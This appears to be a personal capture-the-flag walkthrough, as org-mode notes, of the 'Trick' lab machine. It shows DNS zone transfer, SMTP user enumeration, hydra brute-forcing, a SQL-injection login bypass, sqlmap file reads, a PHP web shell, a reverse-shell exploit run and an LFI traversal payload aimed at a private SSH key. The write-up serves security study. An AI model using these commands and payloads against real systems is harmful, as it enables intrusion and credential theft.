@@ -1,0 +1,1045 @@
+==
+tags:
+=
+
+* nmap scan
+  #+begin_src bat
+  $ sudo nmap -p- -A -T4 10.10.11.166
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
+|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
+|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+80/tcp open  http    nginx 1.14.2
+|_http-title: Coming Soon - Start Bootstrap Theme
+|_http-server-header: nginx/1.14.2
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 23/tcp)
+HOP RTT       ADDRESS
+1   97.06 ms  localhost (10.10.16.1)
+2   182.87 ms localhost (10.10.11.166)
+  #+end_src
+* smtp-user-enum
+  ok, this has been edited, because i actually missed the result previously.
+  #+begin_src bat
+  $ smtp-user-enum -M VRFY -U jsmith.txt -t 10.10.11.166 -m 60 -w 20
+                                                           
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+Mode ..................... VRFY
+Worker Processes ......... 60
+Usernames file ........... jsmith.txt
+Target count ............. 1
+Username count ........... 48705
+Target TCP port .......... 25
+Query timeout ............ 20 secs
+Target domain ............
+                                                           
+######## Scan started at Sat Nov 15 09:46:25 2025 #########
+10.10.11.166: lp exists
+######## Scan completed at Sat Nov 15 12:05:50 2025 #########
+1 results.
+  #+end_src
+** brute force email password for lp user
+   #+begin_src bat
+   hydra -l lp -P /usr/share/wordlists/rockyou.txt -f 10.10.11.166 smtp
+   #+end_src
+* directory fuzzing
+  #+begin_src bat
+  $ ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.166:80/FUZZ
+
+assets
+css
+js
+  #+end_src
+  let's try with the bigger directory list
+  #+begin_src 
+  ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.10.11.166/FUZZ
+  #+end_src
+  same results;
+* nikto - webserver scanning
+  let's try nikto
+  #+begin_src 
+  nikto -h 10.10.11.166 -Tuning b
+
+---------------------------------------------------------------------------
++ Target IP:          10.10.11.166
++ Target Hostname:    10.10.11.166
++ Target Port:        80
++ Start Time:         2025-11-11 14:23:45 (GMT1)
+---------------------------------------------------------------------------
++ Server: nginx/1.14.2
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
+^[+ 1322 requests: 0 error(s) and 2 item(s) reported on remote host
++ End Time:           2025-11-11 14:24:46 (GMT1) (61 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+  #+end_src
+* machine info
+  took a peek at the machine info and it suggested we might need to dig around DNS to find the
+  hostname; let's see what we can do
+* dns
+  #+begin_src bat
+  $ dig -x 10.10.11.166           
+
+; <<>> DiG 9.20.4-4-Debian <<>> -x 10.10.11.166
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 30070
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;166.11.10.10.in-addr.arpa.     IN      PTR
+
+;; ANSWER SECTION:
+166.11.10.10.in-addr.arpa. 600  IN      PTR     localhost.
+
+;; Query time: 12 msec
+;; SERVER: 192.168.178.1#53(192.168.178.1) (UDP)
+;; WHEN: Tue Nov 11 20:00:24 CET 2025
+;; MSG SIZE  rcvd: 77
+  #+end_src
+  gave this output to chatgpt to analyse and it suggests this is useless; however, it gave me
+  some tips to try and find the hostname given the IP address:
+** vhost fuzzing
+    #+begin_src bat
+    $ gobuster vhost -u http://10.10.11.166 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://10.10.11.166
+[+] Method:          GET
+[+] Threads:         30
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Progress: 4989 / 4990 (99.98%)
+===============================================================
+Finished
+===============================================================
+    #+end_src
+** fetch HTTP headers with curl
+   #+begin_src bat
+   $ curl -I http://10.10.11.166/
+
+HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Wed, 12 Nov 2025 08:44:45 GMT
+Content-Type: text/html
+Content-Length: 5480
+Last-Modified: Wed, 23 Mar 2022 16:34:04 GMT
+Connection: keep-alive
+ETag: "623b4bfc-1568"
+Accept-Ranges: bytes
+   #+end_src
+** try every other ip in the subnet
+   #+begin_src bat
+   $ for i in {1..254}; do dig -x 10.10.11.$i +short; done
+   #+end_src
+   returns just 255 lines of =localhost.=
+* DNS
+  ok, back to DNS again after doing a bit of studying and help from chatgpt:
+  #+begin_src bat
+  $ dig @10.10.11.166 AXFR 11.10.10.in-addr.arpa
+
+; <<>> DiG 9.20.4-4-Debian <<>> @10.10.11.166 AXFR 11.10.10.in-addr.arpa
+; (1 server found)
+;; global options: +cmd
+11.10.10.in-addr.arpa.  604800  IN      SOA     trick.htb. root.trick.htb.11.10.10.in-addr.arpa. 3 604800 86400 2419200 604800
+11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.
+166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.
+11.10.10.in-addr.arpa.  604800  IN      SOA     trick.htb. root.trick.htb.11.10.10.in-addr.arpa. 3 604800 86400 2419200 604800
+;; Query time: 39 msec
+;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
+;; WHEN: Sat Nov 15 11:03:25 CET 2025
+;; XFR size: 4 records (messages 1, bytes 206)
+  #+end_src
+  what's happening here? we're able to do a zone transfer using the fact that the reverse
+  lookup has a [[file:d:/code/htb/academy/modules/footprinting/dns.org::*reverse lookup zones][particular format]]; below, chatgpt:
+  #+begin_src 
+  Why did your earlier dig -x 10.10.11.166 return only localhost?
+
+  Because that request went through your normal resolver (your router at 192.168.178.1),
+  not the HTB box's BIND server.
+  Your normal resolver doesn't know anything about HTB's 10.10.x.x reverse zone and just
+  returns a fallback PTR (localhost).
+  But when you explicitly ask the HTB server:
+  dig @10.10.11.166 -x 10.10.11.166
+  or:
+  dig @10.10.11.166 AXFR 11.10.10.in-addr.arpa
+  You bypass your router and query the authoritative DNS server directly.
+  That's why you suddenly see real results.
+  #+end_src
+  using dig's reverse lookup:
+  #+begin_src bat
+  $ dig @10.10.11.166 -x 10.10.11.166
+
+; <<>> DiG 9.20.4-4-Debian <<>> @10.10.11.166 -x 10.10.11.166
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 44497
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 70a9f34e8b3f08783b8ab44369185cfc33c0b77fd97d63e2 (good)
+;; QUESTION SECTION:
+;166.11.10.10.in-addr.arpa.     IN      PTR
+
+;; ANSWER SECTION:
+166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.
+
+;; AUTHORITY SECTION:
+11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.
+
+;; ADDITIONAL SECTION:
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+
+;; Query time: 24 msec
+;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
+;; WHEN: Sat Nov 15 11:30:21 CET 2025
+;; MSG SIZE  rcvd: 163
+  #+end_src
+  however, it can be seen the AXFR reveals more (as is to be expected)
+  ok, so let's add both =trick.htb= as well as =root.trick.htb= to our hosts file.
+  #+begin_src bat
+  $ dig axfr trick.htb @10.10.11.166 
+
+; <<>> DiG 9.20.4-4-Debian <<>> axfr trick.htb @10.10.11.166
+;; global options: +cmd
+trick.htb.                 604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.                 604800  IN      NS      trick.htb.
+trick.htb.                 604800  IN      A       127.0.0.1
+trick.htb.                 604800  IN      AAAA    ::1
+preprod-payroll.trick.htb. 604800  IN      CNAME   trick.htb.
+trick.htb.                 604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+;; Query time: 99 msec
+;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
+;; WHEN: Sat Nov 15 13:50:53 CET 2025
+;; XFR size: 6 records (messages 1, bytes 231)
+  #+end_src
+  ok now we get a new CNAME record - =preprod-payroll.trick.htb=; visiting that:
+* preprod-payroll 
+  we notice it contains a login form
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-15_14-35.png @ 2025-11-15 14:35:56
+  [[file:preprod-payroll/2025-11-15_14-35-56_2025-11-15_14-35.png]]
+* try and bruteforce the login form
+  not sure it's a good idea yet, but still:
+  #+begin_src bat
+  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt preprod-payroll.trick.htb http-post-form "/ajax.php?action=:username=^USER^&password=^PASS^:F=Username or password is incorrect."
+  #+end_src
+  the url was arrived at by intercepting the request with burp:
+  #+begin_src bat
+  POST /ajax.php?action=login HTTP/1.1
+  Host: preprod-payroll.trick.htb
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+  Accept: */*
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  X-Requested-With: XMLHttpRequest
+  Content-Length: 27
+  Origin: http://preprod-payroll.trick.htb
+  Connection: keep-alive
+  Referer: http://preprod-payroll.trick.htb/login.php
+  Cookie: PHPSESSID=66uuoo179bmohv75puvlcsd6hl
+  Priority: u=0
+
+  username=test&password=test
+  #+end_src
+  however, there's still some issue with the hydra command and it returns every creds as valid
+* dnsenum
+  just had an idea to check other possible subdomains as well
+  #+begin_src bat
+  dnsenum --dnsserver 10.10.11.166 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt trick.htb
+  #+end_src
+  however, this didn't reveal anyting new; also, there was an error when it tried to transfer
+  the zone:
+  #+begin_src 
+  Trying Zone Transfers and getting Bind Versions:
+  ------------------------------------------------
+
+unresolvable name: trick.htb at /usr/bin/dnsenum line 892 thread 1.
+
+Trying Zone Transfer for trick.htb on trick.htb ...                                                                   
+AXFR record query failed: no nameservers
+  #+end_src
+  acc. to chatgpt, it fails because:
+  - There are zero NS records
+  - So there is no server it knows to ask for AXFR
+  - It cannot automatically guess the authoritative server (even though you know it's
+    10.10.11.166)
+  dnsenum only attempts AXFR after discovering NS records. Since it finds none, AXFR is
+  impossible.
+* smtp-user-enum
+  ok back to this, turns out =jsmith= is probably not the best thing to try here;
+  connected to the server with nc like so:
+  #+begin_src bash
+  $ nc 10.10.11.166 25
+
+220 debian.localdomain ESMTP Postfix (Debian/GNU)
+                   
+VRFY toot                                                  
+550 5.1.1 <toot>: Recipient address rejected: User unknown in local recipient table
+VRFY lp
+252 2.0.0 lp                                               
+VRFY root
+252 2.0.0 root
+VRFY admin
+550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
+  #+end_src
+  so, turns out root is also a valid user however, it's not present in jsmith; so:
+  #+begin_src bat
+  $ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.11.166 -m 60 -w 20   
+ ----------------------------------------------------------                                                           
+|                   Scan Information                       |
+ ----------------------------------------------------------                                                           
+######## Scan started at Sat Nov 15 21:52:55 2025 #########                                                           
+10.10.11.166: root exists                                                                                             
+10.10.11.166: mysql exists                                                                                            
+######## Scan completed at Sat Nov 15 21:53:05 2025 #########                                                         
+2 results.                                  
+  #+end_src
+* more info about the axfr output
+  the SOA format is =SOA <primary-nameserver> <responsible-party-email>=
+  So in this case:
+  Primary nameserver: trick.htb.
+  Responsible party: root.trick.htb.
+  so =root@trick.htb= is the email address - we've also confirmed this above.
+* openssl
+  it's possible auth might be enabled once connected via openssl
+  #+begin_src bat
+  openssl s_client -connect 10.10.11.166:25 -starttls smtp
+
+AUTH LOGIN
+503 5.5.1 Error: authentication not enabled
+  #+end_src
+* bruteforce ajax login
+  ok instead of wasting time with hydra, we can just use python:
+  #+begin_src python
+  import requests
+
+  url = "http://preprod-payroll.trick.htb/ajax.php?action=login"
+  data = {"username": "", "password": ""}
+  headers = {"X-Requested-With": "XMLHttpRequest"}
+  
+  # the user/password lists are the seclists ones copied into current directory
+  for user in open("./userlist.txt"):
+      user = user.strip()
+      for pwd in open("./passwords.txt"):
+          pwd = pwd.strip()
+  
+          data["username"] = user
+          data["password"] = pwd
+  
+          r = requests.post(url, data=data, headers=headers)
+          if r.text.strip() != "3":
+              print("[+] Hit:", user, pwd)
+  #+end_src
+  no hits;
+* directory fuzzing for the payroll site
+  #+begin_src bat
+  $ ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://preprod-payroll.trick.htb/FUZZ
+
+assets  
+database
+  #+end_src
+  both are forbidden.
+** page fuzz the database dir
+   #+begin_src bat
+   $ ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://preprod-payroll.trick.htb/database/FUZZ.php
+  #+end_src
+  returns nothing
+** page fuzz the assets dir
+   expect it to not return anything, but still:
+  #+begin_src bat
+  $ ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://preprod-payroll.trick.htb/assets/FUZZ.php
+  #+end_src
+  nothing
+* sql injection
+  supplying some random username (or even without any) and the following as password worked:
+  #+begin_src 
+  something' or '1'='1
+  #+end_src
+  and we're able to login as admin
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-17_08-55.png @ 2025-11-17 08:56:00
+  [[file:sql_injection/2025-11-17_08-56-00_2025-11-17_08-55.png]]
+  
+  clicking the user tab, we're able to view the admin creds:
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-17_09-19.png @ 2025-11-17 09:20:34
+  [[file:sql_injection/2025-11-17_09-20-34_2025-11-17_09-19.png]]
+
+  #+begin_src 
+  Enemigosss:SuperGucciRainbowCake
+  #+end_src
+* ssh
+  let's try and ssh using these creds
+  #+begin_src bat
+  $ ssh Enemigosss@10.10.11.166
+
+Enemigosss@10.10.11.166's password: 
+Permission denied, please try again.
+  #+end_src
+* the employee list
+  consists of one john smith
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-17_09-27.png @ 2025-11-17 09:27:58
+  [[file:the_employee_list/2025-11-17_09-27-58_2025-11-17_09-27.png]]
+* username-anarchy
+  let's try and bruteforce ssh login with a username list generated for =john c smith= via
+  username-anarchy
+  #+begin_src bat
+  ./username-anarchy john c smith > john_smith_usernames.txt
+  #+end_src
+* bruteforce ssh login
+  NOTE: the passwords list here is a copy of 2023-200_most_used_passwords.txt
+  #+begin_src bat
+  hydra -L ./john_smith_usernames.txt -P ./passwords.txt ssh://10.10.11.166
+
+[ERROR] ssh target does not support password auth 
+  #+end_src
+  so this is not actually due to password auth not being supported (as can be confirmed by
+  doing something like =ssh -vvv username@ip=), but hydra making a mistake, it can be fixed;
+  chatgpt:
+  #+begin_src 
+  Your SSH server does support password auth, but likely handles it via keyboard-interactive,
+  which Hydra misinterprets and fails on.
+  #+end_src
+  #+begin_src 
+  hydra -L ./john_smith_usernames.txt -P ./passwords.txt ssh://10.10.11.166  -V -K
+  #+end_src
+  the above works, but there are no hits.
+* guided mode
+  after the first few easy questions, a significant one:
+  #+begin_src 
+  what's the name of the software running on preprod-payroll.trick.htb; the hint suggests
+  googling for the page title
+  #+end_src
+  after a bit of searching, it led me to [[https://github.com/ShellUnease/CVE-2024-34833-payroll-management-system-rce][this exploit]].
+  #+begin_src 
+  CVE-2024-34833 Payroll Management System RCE (Unauthenticated) PoC
+
+  Payroll Management System v1.0 allows users to upload images via the "save_settings"
+  page. An unauthenticated attacker can leverage this functionality to upload a malicious PHP
+  file instead. The uploaded files are stored in a publicly accessible folder and have a
+  timestamp with minute precision appended to their filenames, which can be easily
+  calculated. Successful exploitation of this vulnerability results in the ability to execute
+  arbitrary code as the user running the web server.
+  #+end_src
+  NOTE: it might be better to search for the term exploit along with the title since something
+  generic like =employee's payroll management sytsem= brings up a lot of results
+* run the exploit
+  #+begin_src html
+  python3 exploit.py -rhost preprod-payroll.trick.htb -rport 80 -lhost 10.10.16.33 -lport 4444
+
+Uploading a reverse shell via http://preprod-payroll.trick.htb:80/ajax.php?action=save_settings
+<br />
+<b>Warning</b>:  move_uploaded_file(assets/img/1763541600_a.php): failed to open stream: Permission denied in <b>/var/www/payroll/admin_class.php</b> on line <b>108</b><br />
+<br />
+<b>Warning</b>:  move_uploaded_file(): Unable to move '/tmp/phpntdXGH' to 'assets/img/1763541600_a.php' in <b>/var/www/payroll/admin_class.php</b> on line <b>108</b><br />
+<br />
+<b>Notice</b>:  Trying to get property 'num_rows' of non-object in <b>/var/www/payroll/admin_class.php</b> on line <b>115</b><br />
+  #+end_src
+* searchsploit
+  since the above doesn't work, let's look for other exploits
+  #+begin_src
+  $ searchsploit payroll
+
+Simple Payroll System 1.0 - SQLi Authentication Bypass  | php/webapps/50403.txt
+  #+end_src
+  this is the only relevant result, and it's what we've already discovered.
+* guided mode
+  the next question is
+  #+begin_src
+  what kind of privilege does the database user have
+  #+end_src
+  and the hint suggests using sqlmap so let's do that
+* sqlmap
+  let's copy the login request from burp onto a file and run sqlmap
+** the request
+   #+begin_src bash
+  $ cat login-req.txt                                                      
+
+POST /ajax.php?action=login HTTP/1.1
+Host: preprod-payroll.trick.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 19
+Origin: http://preprod-payroll.trick.htb
+Connection: keep-alive
+Referer: http://preprod-payroll.trick.htb/login.php
+Cookie: PHPSESSID=66uuoo179bmohv75puvlcsd6hl
+Priority: u=0
+
+username=&password=
+    #+end_src
+** sqlmap db enumeration
+  #+begin_src bash
+  $ sqlmap -r login-req.txt --batch  --current-user --current-db --is-dba
+                                               
+[*] starting @ 17:17:14 /2025-11-19
+[17:17:14] [INFO] parsing HTTP request from 'login-req.txt'
+[17:17:14] [WARNING] provided value for parameter 'username' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly                                                                               
+[17:17:14] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly                                                                               
+[17:17:14] [INFO] resuming back-end DBMS 'mysql'
+[17:17:14] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=' AND (SELECT 4167 FROM (SELECT(SLEEP(5)))Tvnh) AND 'IxAJ'='IxAJ&password=
+---
+[17:17:15] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[17:17:15] [INFO] fetching current user
+[17:17:15] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[17:17:23] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[17:17:33] [INFO] adjusting time delay to 1 second due to good response times
+remo@localhost
+current user: 'remo@localhost'
+[17:18:29] [INFO] fetching current database
+[17:18:29] [INFO] retrieved: payroll_db
+current database: 'payroll_db'
+[17:19:14] [INFO] testing if current user is DBA
+[17:19:14] [INFO] fetching current user
+current user is DBA: False
+[17:19:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+
+[*] ending @ 17:19:15 /2025-11-19/
+  #+end_src
+  this still doesn't fetch the current user's privileges so let's try the =--privileges= switch
+** db user privileges
+   #+begin_src bat
+   $ sqlmap -r login-req.txt --batch --current-user --privileges
+
+   <SNIP>
+[17:50:52] [INFO] adjusting time delay to 1 second due to good response times
+'remo'@'localhost'
+[17:52:10] [INFO] fetching number of privileges for user 'remo'
+[17:52:10] [INFO] retrieved: 1
+[17:52:12] [INFO] fetching privileges for user 'remo'
+[17:52:12] [INFO] retrieved: FILE
+database management system users privileges:
+[*] %remo% [1]:
+    privilege: FILE
+   #+end_src
+   ok, so it's file read privileges
+** read files
+   #+begin_src bat
+   sqlmap -r login-req.txt --batch --file-read "/etc/passwd"
+
+26F6F743A783A303A303A726F6F743A2F726F6F743A2F62696E2F626173680A6461656D6F6E3A783A313A313A6461656D6F6E3A2F7573722F7362696E3A2F7^C  
+   #+end_src
+   it takes a while, but it's working
+** write files
+   let's write a web shell
+    #+begin_src bat
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+    #+end_src
+    transfer this file
+    #+begin_src bat
+    $ sqlmap -r login-req.txt --batch  --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+
+<SNIP>
+[18:03:16] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+    #+end_src
+** find out where we can write files to
+   =os-shell= - If FILE privilege is active, sqlmap will detect and try possible locations
+   automatically:
+   #+begin_src bash
+   $ sqlmap -r login-req.txt --batch  --os-shell
+
+which web application language does the web server support?
+[1] ASP                                     
+[2] ASPX
+[3] JSP
+[4] PHP (default)                                        
+> 4
+[19:20:51] [INFO] retrieved the web server document root: '/var/www'
+[19:20:51] [INFO] retrieved web server absolute paths: '/var/www/payroll/admin_class.php'
+[19:20:51] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
+[19:20:52] [WARNING] unable to upload the file stager on '/var/www/'
+[19:20:52] [INFO] trying to upload the file stager on '/var/www/payroll/' via LIMIT 'LINES TERMINATED BY' method
+[19:20:53] [WARNING] unable to upload the file stager on '/var/www/payroll/'
+[19:20:53] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 7 times
+   #+end_src
+   ok since this isn't working, let's try and read =/var/www/payroll/admin_class.php=
+   #+begin_src bat
+   sqlmap -r login-req.txt --batch --file-read "/var/www/payroll/admin_class.php"
+   #+end_src
+   this takes forever.
+* guided mode
+  the question is
+  #+begin_src 
+  what is another virtual host nginx is configured for
+  #+end_src
+  meaning we'll have to read the nginx conf file. i'd briefly considered this smh
+* read nginx conf
+  #+begin_src bat
+  $ sqlmap -r login-req.txt --batch --file-read "/etc/nginx/nginx.conf" 
+  #+end_src
+  even this was taking way too much time, so i ended up looking at the solution -- they use
+  =level= and =risk= and try if anything other than Blind/Time-Based injection is possible like so
+  #+begin_src bat
+  $ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch
+  #+end_src
+  an interesting note is they (and the exploit suggestion) says the vulnerable field is
+  username, however, we were able to inject the password field.
+  according to chatgpt, it also makes a difference that they supply actual data (=abc=) for the
+  params whereas they are empty in our request and also specify the injectable field.
+  so, download the file:
+  #+begin_src bat
+  $ sqlmap  -u http://preprod-payroll.trick.htb/ajax.php?action=login -data="username=abc&password=abc" -p username --file-read="/etc/nginx/nginx.conf" --level=5 --risk=3 --technique=BEUS --batch 
+
+[07:58:45] [INFO] the local file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf' and the remote file '/etc/nginx/nginx.conf' have the same size (1482 B)
+files saved to [1]:
+[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf (same file)
+  #+end_src
+  in any case, we get the same result with out request file:
+  #+begin_src bat
+  $ sqlmap  -r ./login-req.txt --file-read="/etc/nginx/nginx.conf" --level=5 --risk=3 --technique=BEUS --batch
+
+07:59:38] [INFO] the local file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf' and the remote file '/etc/nginx/nginx.conf' have the same size (1482 B)
+files saved to [1]:
+[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf (same file)
+  #+end_src
+* look at the downloaded file contents
+  the relevant portion is:
+  #+begin_src bash
+  http {
+        ##
+        # Virtual Host Configs
+        ##
+
+        include /etc/nginx/conf.d/*.conf;
+        include /etc/nginx/sites-enabled/*;
+  }
+  #+end_src
+  how do we know the filenames?
+  so it's this
+* download the actual file
+  #+begin_src bat
+  $ sqlmap  -r ./login-req.txt --file-read="/etc/nginx/sites-enabled/default" --level=5 --risk=3
+  #+end_src
+  looking at the downloaded file we get the following block
+  #+begin_src bash
+server {                      
+        listen 80;      
+        listen [::]:80;
+                                                           
+        server_name preprod-marketing.trick.htb;
+                                                           
+        root /var/www/market;
+        index index.php;   
+                                                           
+        location / {                                                                                                  
+                try_files $uri $uri/ =404;
+        }
+
+        location ~ \.php$ {       
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+        }
+}
+  #+end_src
+  so, it's =preprod-marketing.trick.htb=
+  visiting the URL, we're met with a bootstrap static site with a contact form which doesn't
+  do anything
+* try writing files to the newly discovered location
+  #+begin_src 
+  $ sqlmap -r login-req.txt --batch --file-write "shell.php" --file-dest "/var/www/market/shell.php"
+  #+end_src
+  fails
+* download custom FPM pool fast-cgi conf for michael user
+  #+begin_src 
+  $ sqlmap  -r ./login-req.txt --file-read="/etc/php/7.3/fpm/pool.d/michael.conf" --level=5 --risk=3
+  #+end_src
+  file contains nothing interesting
+* fuzz for cgi dirs
+  #+begin_src bat
+  $ ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://preprod-marketing.trick.htb/FUZZ
+
+img
+css
+js
+  #+end_src
+* guided mode - email directory
+  there was a question regarding the default directory for storing mail, the answer for which
+  is =/var/mail=; so I assumed we might try and read michael's emails by fetching the files from
+  that directory
+  #+begin_src bat
+  $ sqlmap  -r ./login-req.txt --file-read="/var/mail/michael" --level=5 --risk=3 --batch
+
+[16:48:54] [INFO] fetching file: '/var/mail/michael'
+[16:48:54] [INFO] retrieved: ' '
+[16:48:54] [ERROR] no data retrieved
+  #+end_src
+* page-fuzz the newly discovered vhost
+  #+begin_src bat
+  $ ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://preprod-marketing.trick.htb/FUZZ.php
+  #+end_src
+  reveals just index.php
+  #+begin_src bat
+  $ ffuf -s -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://preprod-marketing.trick.htb/FUZZ.html
+  #+end_src
+  reveals the 4 pages we already know of - about, home, contact, services
+* file inclusion scanning
+  #+begin_src 
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://preprod-marketing.trick.htb/index.php?FUZZ=value'  -fs 9660
+
+page
+  #+end_src
+  #+begin_src 
+  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://preprod-marketing.trick.htb/index.php?page=FUZZ' -fs 0
+
+....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 201ms]
+  #+end_src
+  here we go, let's see if it works.
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-23_12-58.png @ 2025-11-23 12:58:38
+  [[file:file_inclusion_scanning/2025-11-23_12-58-38_2025-11-23_12-58.png]]
+  ok, let's see if we can get michael's id_rsa
+* michael's private key
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-11-23_13-02.png @ 2025-11-23 13:02:38
+  [[file:michael's_private_key/2025-11-23_13-02-38_2025-11-23_13-02.png]]
+
+
+  #+begin_src 
